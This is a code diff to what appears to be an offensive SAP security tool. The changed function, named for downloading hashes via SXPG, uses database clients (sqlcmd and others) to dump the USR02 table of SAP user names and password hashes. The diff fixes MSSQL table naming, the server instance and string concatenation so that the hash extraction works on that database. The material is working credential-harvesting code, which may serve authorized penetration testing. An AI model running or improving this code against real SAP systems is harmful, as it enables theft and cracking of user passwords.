@@ -1563,6 +1563,9 @@ def _download_hashes_via_sxpg(node: SAPNode,
 
     chunk = 120  # max hex chars per SXPG output line
 
+    # cat: SQL string-concatenation operator (|| for ANSI DBs, + for MSSQL)
+    cat = "||"
+
     if db_type in ("HDB", "HANA"):
         tbl = "USR02"
         hex_fn_bcode = "BINTOHEX(BCODE)"
@@ -1581,13 +1584,19 @@ def _download_hashes_via_sxpg(node: SAPNode,
                                          f"-U DEFAULT {sql}", creds)
     elif db_type == "MSS":
         sid = node.sid
-        tbl = f"[{sid}].[{sid}].[USR02]"
+        # Database name stays uppercase (USE TWT); schema owner is lowercase
+        # (twt.USR02) because SAP MSSQL uses case-sensitive collation and the
+        # dbs/mss/schema profile parameter is always lowercase.
+        tbl = f"[{sid.upper()}].[{sid.lower()}].[USR02]"
         hex_fn_bcode = "CONVERT(VARCHAR(100),BCODE,2)"
         hex_fn_passcode = "CONVERT(VARCHAR(100),PASSCODE,2)"
         sub_fn = "SUBSTRING"
+        # MSSQL uses named instance .\<SID>_DB; TCP/1433 is typically disabled.
+        _mss_server = f".\\{sid.upper()}_DB"
+        cat = "+"   # MSSQL uses + for string concatenation, not ||
         def run_q(sql):
             return execute_local_command(node, "sqlcmd",
-                                         f"-S localhost -h -1 -W -Q {sql}", creds)
+                                         f"-S {_mss_server} -h -1 -W -Q {sql}", creds)
     elif db_type in ("ORA", "ORACLE"):
         tbl = "SAPSR3.USR02"
         hex_fn_bcode = "RAWTOHEX(BCODE)"
@@ -1603,9 +1612,10 @@ def _download_hashes_via_sxpg(node: SAPNode,
           f"for full hashes...")
 
     # Query 1: MANDT, BNAME, CODVN, USTYP, UFLAG, PWDSALTEDHASH (all CHAR fields)
+    # Uses db-specific concatenation operator (|| for ANSI, + for MSSQL)
     r_meta = run_q(
-        f"SELECT MANDT||'~~~'||BNAME||'~~~'||CODVN||'~~~'||USTYP"
-        f"||'~~~'||UFLAG||'~~~'||PWDSALTEDHASH FROM {tbl}")
+        f"SELECT MANDT{cat}'~~~'{cat}BNAME{cat}'~~~'{cat}CODVN{cat}'~~~'{cat}USTYP"
+        f"{cat}'~~~'{cat}UFLAG{cat}'~~~'{cat}PWDSALTEDHASH FROM {tbl}")
 
     if not r_meta.get("success"):
         print(f"[-] {node.sid}: SXPG USR02 meta query failed: "
